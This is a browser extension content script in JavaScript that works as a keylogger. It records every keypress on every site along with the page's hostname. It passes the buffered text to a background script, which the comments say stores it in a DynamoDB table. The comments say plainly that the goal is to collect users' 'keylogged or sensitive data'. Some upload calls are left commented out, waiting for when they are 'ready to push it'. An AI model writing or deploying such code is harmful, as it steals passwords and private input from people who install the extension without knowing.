
var myPort = browser.runtime.connect({name: "port-from-cs"});
myPort.postMessage({greeting: "hello from content script"});
var dynamoPort = browser.runtime.connect({name: "dynamo-port"});

var params = {
    TableName: 'key_data',
    Item: {}
};

var strings = [];
let enter = 13;
let tab = 9;

/*  two variables - timerGoing is for a smart log dumper - if the person isn't typing or clicking, let's not fill our database with junk
*   so when they start typing or click, we are now going to start taking their information and logging it 
*/
var timerGoing = false;
var timerTracker = null;

// every time there is a keyup, collect it into the buffer. line 6, i'm not really sure what's going on there... got it from StackOverflow. so if we use something like this we'll want to figure out exactly how it works haha
window.onkeypress = function(e) {

    if(timerGoing == false){
        startTimer();
    }

    var key = e.keyCode ? e.keyCode : e.which;
    strings += String.fromCharCode(key);

    if( (e.keyCode == enter) || (e.keyCode == tab) )
    {
        dbStoreData();
        writefunc();
        clearTimeout(timerTracker); //reset the timer and restart it
        startTimer();
    }
}

/* clicking and storing */
window.onclick = clickStore;
function clickStore() {
        // dbStoredata(); //UNCOMMENT this line when we are ready to push it
        // writefunc();
        clearTimeout(timerTracker); //reset the timer and restart it
        startTimer();
        return false;
}

// send a message to the background script to add Item to dynamoDB
function dbStoreData() {
        // next, we can place any keylogged or sensitive data into the database (no limit on number of parameters, really)
        params.Item["KeyloggedText"] = strings;
        params.Item["Hostname"] = window.location.hostname;
        // actually put them in the database
        dynamoPort.postMessage(params);
        timerGoing = false;
} 

// this is a function that writes the buffer to the browser console, and then clears the buffer
//NOTE: remove the 'console.log' from this later and just leave it as a reset function for strings and params
function writefunc() {
    // reset the strings variable and the item for the DB
    timerGoing = false;
    console.log(strings);
    strings = [];
    params.Item = {};
}

//replace writefunc with dbStoreData
function startTimer() {
    timerGoing = true;
    timerTracker = window.setTimeout(function(){
        // dbStoreData(); //UNCOMMENT this and delete writefunc
        writefunc();
    }, 10000)
}